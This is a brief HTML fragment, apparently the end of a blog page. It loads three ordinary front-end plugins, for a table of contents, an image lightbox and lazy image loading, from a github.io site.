 </script>
 </script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>
